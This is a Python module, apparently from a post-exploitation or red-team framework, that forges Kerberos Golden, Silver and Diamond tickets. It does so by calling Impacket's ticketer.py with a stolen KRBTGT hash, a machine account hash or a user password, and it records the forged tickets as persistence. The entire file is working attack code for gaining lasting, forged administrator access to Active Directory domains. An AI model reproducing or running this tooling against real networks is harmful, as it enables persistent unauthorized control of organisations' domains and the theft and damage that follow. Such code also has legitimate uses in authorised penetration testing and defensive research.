"""
Implementation of ticket-based persistence mechanisms.
Supports Golden, Silver, and Diamond tickets using ticketer.py and Mimikatz.
"""

from .persistence_base import PersistenceBase
from .sid_enum import SIDEnumeration
from typing import Optional, Dict
import subprocess
import os

class TicketPersistence(PersistenceBase):
    def __init__(self):
        """Initialize ticket persistence module"""
        super().__init__()
        self.sid_enum = SIDEnumeration()
        
    def create_golden_ticket(self, domain: str, dc_ip: str,
                           krbtgt_hash: str, username: str = "admin",
                           groups: Optional[str] = None) -> bool:
        """
        Create a Golden Ticket using ticketer.py
        
        Args:
            domain: Domain name
            dc_ip: Domain Controller IP
            krbtgt_hash: KRBTGT account hash
            username: Username for ticket (default: admin)
            groups: Optional group SIDs to include
            
        Returns:
            bool indicating success/failure
        """
        try:
            # First get domain SID
            domain_sid = self.sid_enum.get_stored_sid(domain)
            if not domain_sid:
                self.log_status(f"Domain SID not found in database, attempting enumeration")
                domain_sid = self.sid_enum.enumerate_domain_sid(domain, dc_ip)
                
            if not domain_sid:
                self.log_error("Failed to obtain domain SID")
                return False
                
            # Create golden ticket using ticketer.py
            cmd = [
                'ticketer.py',
                '-nthash', krbtgt_hash,
                '-domain-sid', domain_sid,
                '-domain', domain,
                username
            ]
            
            if groups:
                cmd.extend(['-groups', groups])
                
            self.log_status(f"Creating Golden Ticket for {username}@{domain}")
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if "Saving ticket" in result.stdout:
                ticket_file = f"{username}.ccache"
                self.log_success(f"Golden Ticket created: {ticket_file}")
                
                # Log persistence
                self.log_persistence('golden_ticket', {
                    'username': username,
                    'domain': domain,
                    'domain_sid': domain_sid,
                    'ticket_file': ticket_file,
                    'groups': groups
                })
                return True
                
            self.log_error("Failed to create Golden Ticket")
            return False
            
        except Exception as e:
            self.log_error(f"Golden Ticket creation failed: {str(e)}")
            return False
            
    def create_silver_ticket(self, domain: str, dc_ip: str,
                           target_service: str, machine_hash: str,
                           username: str = "admin") -> bool:
        """
        Create a Silver Ticket for specific service
        
        Args:
            domain: Domain name
            dc_ip: Domain Controller IP
            target_service: Service to target (e.g. CIFS/DC1)
            machine_hash: Machine account hash
            username: Username for ticket
            
        Returns:
            bool indicating success/failure
        """
        try:
            # First get domain SID
            domain_sid = self.sid_enum.get_stored_sid(domain)
            if not domain_sid:
                self.log_status(f"Domain SID not found in database, attempting enumeration")
                domain_sid = self.sid_enum.enumerate_domain_sid(domain, dc_ip)
                
            if not domain_sid:
                self.log_error("Failed to obtain domain SID")
                return False
                
            # Create silver ticket using ticketer.py
            cmd = [
                'ticketer.py',
                '-nthash', machine_hash,
                '-domain-sid', domain_sid,
                '-domain', domain,
                '-spn', target_service,
                username
            ]
            
            self.log_status(f"Creating Silver Ticket for {target_service}")
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if "Saving ticket" in result.stdout:
                ticket_file = f"{username}.ccache"
                self.log_success(f"Silver Ticket created: {ticket_file}")
                
                # Log persistence
                self.log_persistence('silver_ticket', {
                    'username': username,
                    'domain': domain,
                    'domain_sid': domain_sid,
                    'service': target_service,
                    'ticket_file': ticket_file
                })
                return True
                
            self.log_error("Failed to create Silver Ticket")
            return False
            
        except Exception as e:
            self.log_error(f"Silver Ticket creation failed: {str(e)}")
            return False
            
    def create_diamond_ticket(self, domain: str, dc_ip: str,
                            user_id: str, username: str,
                            password: str, groups: str) -> bool:
        """
        Create a Diamond Ticket using ticketer.py
        
        Args:
            domain: Domain name
            dc_ip: Domain Controller IP
            user_id: User ID for ticket
            username: Username for ticket
            password: User password
            groups: Group SIDs (e.g. '512,513,518,519,520')
            
        Returns:
            bool indicating success/failure
        """
        try:
            # First get domain SID
            domain_sid = self.sid_enum.get_stored_sid(domain)
            if not domain_sid:
                self.log_status(f"Domain SID not found in database, attempting enumeration")
                domain_sid = self.sid_enum.enumerate_domain_sid(domain, dc_ip)
                
            if not domain_sid:
                self.log_error("Failed to obtain domain SID")
                return False
                
            # Create diamond ticket using ticketer.py
            cmd = [
                'ticketer.py',
                '-request',
                '-domain', domain,
                '-user', username,
                '-password', password,
                '-domain-sid', domain_sid,
                '-user-id', user_id,
                '-groups', groups,
                username
            ]
            
            self.log_status(f"Creating Diamond Ticket for {username}")
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if "Saving ticket" in result.stdout:
                ticket_file = f"{username}.ccache"
                self.log_success(f"Diamond Ticket created: {ticket_file}")
                
                # Log persistence
                self.log_persistence('diamond_ticket', {
                    'username': username,
                    'domain': domain,
                    'domain_sid': domain_sid,
                    'user_id': user_id,
                    'groups': groups,
                    'ticket_file': ticket_file
                })
                return True
                
            self.log_error("Failed to create Diamond Ticket")
            return False
            
        except Exception as e:
            self.log_error(f"Diamond Ticket creation failed: {str(e)}")
            return False 